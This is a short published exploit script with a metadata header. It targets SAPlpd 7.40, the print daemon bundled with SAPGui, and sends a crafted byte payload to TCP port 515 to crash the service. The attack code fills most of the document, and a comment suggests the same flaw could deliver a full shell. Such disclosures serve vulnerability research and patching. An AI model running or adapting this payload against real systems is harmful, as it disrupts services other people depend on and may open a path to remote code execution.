# Exploit Title: SAPlpd 7.40 Denial of Service
# Date: 2016-12-28
# Exploit Author: Peter Baris
# Exploit code: http://saptech-erp.com.au/resources/saplpd_dos.zip
# Version: 7.40 all patch levels (as a part of SAPGui 7.40)  
# Tested on: Windows Server 2008 R2 x64, Windows 7 Pro x64


import socket

# Opcodes 03h and 04h are vulnerable to bad characters 00h and 0ah
# So you can modify the DoS accordingly
# The added 800 A's are just to show, that you can deliver a complete shell with the command

DoS = ("\x03"+"\x0a"+"\x41"*800)


s = socket.socket()
s.settimeout(1)
s.connect(('192.168.198.132', 515))
print("[*] Crashing SAPlpd 7.40")
print("[*] Payload length: "+str(len(DoS))+" bytes")
s.send(DoS)
s.close()